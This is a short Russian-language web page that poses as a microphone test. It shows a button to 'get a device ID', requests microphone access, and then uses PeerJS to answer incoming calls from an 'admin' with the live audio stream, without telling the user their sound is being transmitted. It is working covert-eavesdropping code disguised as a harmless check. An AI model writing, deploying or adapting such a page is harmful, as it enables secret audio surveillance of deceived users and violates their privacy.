<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Система проверки</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1e1e1e; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #333; }
        button { background: #0070f3; color: white; border: none; padding: 15px 30px; border-radius: 7px; font-size: 18px; cursor: pointer; }
        #my-id { margin-top: 20px; font-size: 24px; color: #00ff41; font-family: monospace; font-weight: bold; }
        p { color: #888; }
    </style>
</head>
<body>

<div class="box">
    <h2>Проверка микрофона</h2>
    <p>Нажмите на кнопку ниже, чтобы получить ID устройства</p>
    <button onclick="startSession()">ПОЛУЧИТЬ ID</button>
    <div id="my-id"></div>
</div>

<script>
    // Генерируем случайный ID для этого пользователя
    const deviceId = 'id-' + Math.floor(Math.random() * 90000);
    const peer = new Peer(deviceId);

    function startSession() {
        // Запрашиваем микрофон ПОСЛЕ клика
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then((stream) => {
                // Показываем ID пользователю
                document.getElementById('my-id').innerText = "ВАШ ID: " + deviceId;
                
                // Ждем входящего подключения от админа
                peer.on('call', (call) => {
                    console.log("Входящее подключение...");
                    call.answer(stream); // Отправляем звук админу
                });
            })
            .catch((err) => {
                alert("Ошибка: Доступ к микрофону отклонен!");
                console.error(err);
            });
    }
</script>

</body>
</html>
